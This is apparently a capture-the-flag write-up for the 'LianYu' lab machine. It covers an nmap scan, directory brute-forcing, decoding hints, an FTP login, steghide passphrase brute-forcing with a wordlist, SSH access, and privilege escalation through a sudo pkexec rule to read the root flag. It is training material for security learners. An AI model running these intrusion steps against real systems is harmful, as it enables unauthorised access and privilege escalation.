Always start with Nmap
```console
kali@kali:~/LianYu$ nmap -p- -A 10.10.209.111 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 18:43 EDT                               
Nmap scan report for 10.10.209.111             
Host is up (0.047s latency).                   
Not shown: 65530 closed ports                  
PORT      STATE SERVICE VERSION                
21/tcp    open  ftp     vsftpd 3.0.2           
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)                          
| ssh-hostkey:                                 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)                                
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)                                
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35080/tcp6  status
|   100024  1          50089/tcp   status
|   100024  1          55191/udp   status
|_  100024  1          57921/udp6  status
50089/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.02 seconds
```
run ```dirbuster``` using ```usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt```. give it sometime and it will find a directory call **island**. View the source code of the page, you will find something.
```html
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
```
We know that we are looking for another directory which is a number from **HINT**. Now let brute force more but this time start the directory at ```/island/``` (Dir to start with) instead. Give it a while. you will find ```/island/2100/``` which is the anwser to
```html
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```
now check the youtube comment
```
Try fuzzing it with .ticket extension.
Answer in b64: Z3JlZW5fYXJyb3cudGlja2V0
```
now use ```base64``` to decode it
```console
kali@kali:~/LianYu$ echo "Z3JlZW5fYXJyb3cudGlja2V0" > b64.txt
kali@kali:~/LianYu$ base64 -d b64.txt 
green_arrow.ticket
```
another way to solve it is using dirbuster again but this time fill **Dir to start with**: ```/island/2100``` and **File Extention**: ```ticket```. let it run and it will give u the http 200 code.


now visit ```http://<ip>/island/2100/green_arrow.ticket```
```html
<pre>
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX

</pre>
```
from hint, we can use https://gchq.github.io/CyberChef/ to crack the code which is the password to FTP hint **baseXX**


Now login to FTP server, use ``vigilante`` as usernam and the cracked password from last task.
```console
kali@kali:~/LianYu$ ftp 10.10.209.111
Connected to 10.10.209.111.
220 (vsFTPd 3.0.2)
Name (10.10.209.111:kali): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01 06:55 slade
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 vigilante
226 Directory send OK.
```
use ```get <filename>``` to get everything and ```exit```. not the lasly I run ```cd ..``` to redirect to previous directory and I found out that there is 2 user ```slade``` and ```vigilante```.


now let check the pictures that we downloaded from FTP server. note that one of the image is corrupted
```console
kali@kali:~/LianYu$ file Leave_me_alone.png 
Leave_me_alone.png: data
```
seem like the header/file signature is wrong. check this [link](https://en.wikipedia.org/wiki/List_of_file_signatures) and find signature for .png file. When you found it, run ```hexeditor <filename>``` and fix the file signature to the correct signature (```89 50 4E 47 0D 0A 1A 0A```)


It seem like I should Leave it alone (like the file name said). I couldn't find anything from the recovered image... ofc ```steghide``` will not work since the image is .png.


So I have no choice than try to brute force steghide on ```aa.jpg```. I found a simple bash script [here](https://gist.github.com/itsecurityco/503970852ac47cd6a3b356590d824a2c) which can be use to brute forcing steghid. copy the script and make it executable (``chmod +x``). Now run the script.
```console
kali@kali:~/LianYu$ steghidebf.sh aa.jpg /usr/share/wordlists/rockyou.txt 
Steghide Bruteforce (c) 2017 by Juan Escobar
stegofile: aa.jpg
wordlist:  /usr/share/wordlists/rockyou.txt

/usr/share/wordlists/rockyou.txt/usr/share/wordlists/rockyou.txt/usr/share/wordlists/rockyou.txt/usr/share/wordlists/rockyou.txt[+] Information obtained with passphrase: 'password'
wrote extracted data to "ss.zip".

kali@kali:~/LianYu$ ls
 aa.jpg    Leave_me_alone.png    ss.zip
 b64.txt  "Queen's_Gambit.png"
kali@kali:~/LianYu$ file ss.zip 
ss.zip: Zip archive data, at least v2.0 to extract
kali@kali:~/LianYu$ unzip ss.zip 
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado 
```
you will find the ssh password in **shado**: ```cat shado```. We got the password, what are we waiting for? let SSH to the target. When we accessed FTP, we found out that there is 2 users, try both!
```console
 Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

Last login: Tue May 26 20:03:47 2020 from ip-10-8-14-151.eu-west-1.compute.internal
```
a beautiful wellcome message :D. you will found the 1st flag right here. so ```cat``` it. You will find a cool quote by Felicity Smoak said ```people keep secret  computer don't```.


now run sudo -l to find out what sudo command this user can execute.
```console
slade@LianYu:~$ sudo -l
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on
        LianYu:
    (root) PASSWD: /usr/bin/pkexec
```
seem like this user can run ```pkexec``` which allow the user execute a command as another user. now let try to ```cat root.txt```
```console
slade@LianYu:~$ sudo pkexec cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{SOMETHING HERE YOU NEED TO FIND OUT BY YOURSELFT}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

that is it guys. GLHF and stay home.

